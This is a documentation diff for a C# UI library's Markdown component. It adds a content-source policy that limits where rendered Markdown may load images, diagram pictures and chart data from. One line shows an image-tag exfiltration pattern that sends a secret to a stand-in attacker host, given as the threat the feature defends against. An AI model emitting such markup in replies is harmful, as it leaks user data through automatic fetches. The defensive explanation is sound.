@@ -10,8 +10,9 @@ display. Setting `Text` re-renders.
 
 ## Create
 
-`MarkdownBlock(string text = "", MarkdownSanitization sanitization = MarkdownSanitization.Default)`
-— renders the given Markdown. Bring the factory into scope with `using static Tesserae.UI;`.
+`MarkdownBlock(string text = "", MarkdownSanitization sanitization = MarkdownSanitization.Default, MarkdownContentSources sources = null)`
+— renders the given Markdown; `sources` says where it may load content from (see
+[Content sources](#content-sources); `null` is `Any`). Bring the factory into scope with `using static Tesserae.UI;`.
 
 ## Key configuration
 
@@ -20,6 +21,9 @@ display. Setting `Text` re-renders.
 - `.CanWrap` — whether the rendered text may wrap (false adds `tss-text-nowrap`).
 - `.Sanitization(MarkdownSanitization)` — change how strictly the HTML is sanitized
   and re-render the current source with it.
+- `.ContentSources(MarkdownContentSources)` — where the Markdown may load content
+  from (images, a diagram's pictures, a chart's data); re-renders, and every later
+  render keeps it. See [Content sources](#content-sources).
 - `.OnAfterRender(Action<HTMLElement>)` — called with the inner element every time
   the source is re-parsed, for post-processing the rendered tree (wrapping code
   blocks, attaching copy buttons, …).
@@ -58,6 +62,57 @@ string and `Markdown.RenderMarkdownSanitized(text, sanitization)` returns a rend
 element (`Markdown.RenderMarkdownSanitized(text, sanitization, flintTheme)` also draws
 Flint charts).
 
+## Content sources
+
+`MarkdownSanitization.Default` lets the browser fetch any URL the Markdown names, with
+no click: `![](https://attacker.example/x.png?d=<secret>)` in a model's reply sends the
+secret away. `MarkdownContentSources` is the middle ground between that and
+`NoLinksOrEmbeddedContent`: links stay clickable, and content loads only from where you
+say. It is independent of the sanitization mode, and the two compose.
+
+- `MarkdownContentSources.Any` — the default: nothing is filtered or looked at.
+- `MarkdownContentSources.SameOrigin` — the page's own origin: relative URLs, and
+  `data:` / `blob:` URLs.
+- `MarkdownContentSources.SameOriginAnd(params string[] hosts)` (or an
+  `IEnumerable<string>`) — plus `http`/`https` URLs on the listed hosts. An entry is a
+  host name, case-insensitive; `*.example.com` also matches every subdomain and
+  `example.com` itself. An entry with a scheme, a port or a path never matches.
+- `.Allows(string url)` — the same rule for a URL your own code is about to render
+  (a thumbnail a tool or a model supplied). `.IsRestricted`, `.Hosts`, `.Key`; two
+  policies with the same hosts are `Equals`.
+
+What a restricting policy does:
+
+- **Prose** — `src`, every candidate of a `srcset`, `poster`, `background`, `data`, an
+  `href` on `<link>` and on SVG elements other than `<a>`, a `style` attribute or
+  `<style>` element that fetches, an SVG presentation attribute with a `url(...)` that
+  is not `url(#id)`: the attribute goes when its URL is not allowed, the element and
+  the text around it stay. `<a href>` is never touched.
+- **Mermaid diagrams** — a picture from elsewhere is left out, on the first draw and on
+  every relayout.
+- **Flint charts** — a chart that would load from elsewhere is not drawn and stays its
+  code block, with the reason as its tooltip: a `url` anywhere in the spec (`data.url`,
+  a map's `chartProperties.levels[].url`), a `Map` / `Choropleth` unless
+  `vega.github.io` and `cdn.jsdelivr.net` are listed (Flint's built-in outlines), and
+  the tooltip's picture — a data column named `image` holding a URL that is not
+  allowed, or an encoding `title` of `image`.
+
+```csharp
+// An assistant reply: links work, pictures only from this app and its image CDN.
+var sources = MarkdownContentSources.SameOriginAnd("images.example.com", "*.cdn.example.com");
+var reply   = MarkdownBlock(assistantText, sources: sources).Flint();
+
+reply.Text = nextChunk;                       // still filtered
+if (sources.Allows(thumbnailUrl)) { /* render your own <img> */ }
+```
+
+The static helpers take the policy right after the text:
+`Markdown.ConvertMarkdownSanitized(text, sources, sanitization = Default)`,
+`Markdown.RenderMarkdownSanitized(text, sources, sanitization = Default)` and
+`Markdown.RenderMarkdownSanitized(text, sources, sanitization, flintTheme, overrideFenceTheme = false)`.
+Pass the policy to the constructor (or set it before the text) for Markdown that must
+never load from elsewhere: the block renders as soon as it has text.
+
 ## Mermaid diagrams
 
 A fenced code block tagged `mermaid` is drawn as a diagram by [Pele](https://pele.run),
@@ -82,7 +137,8 @@ flowchart LR
   RetroOS and Rechenwerk packages each add a few rules so a diagram is framed like their code blocks). Override a
   `--pele-*` variable on `.tss-mermaid` to restyle.
 - **Safe.** The SVG goes through DOMPurify; `MarkdownSanitization.NoLinksOrEmbeddedContent`
-  also turns off links and images inside diagrams.
+  also turns off links and images inside diagrams, and a `MarkdownContentSources` policy
+  keeps a diagram's pictures to the sources it allows.
 - `Markdown.ConvertMarkdownSanitized` returns a string, so it leaves the fence as a
   `language-mermaid` code block.
 
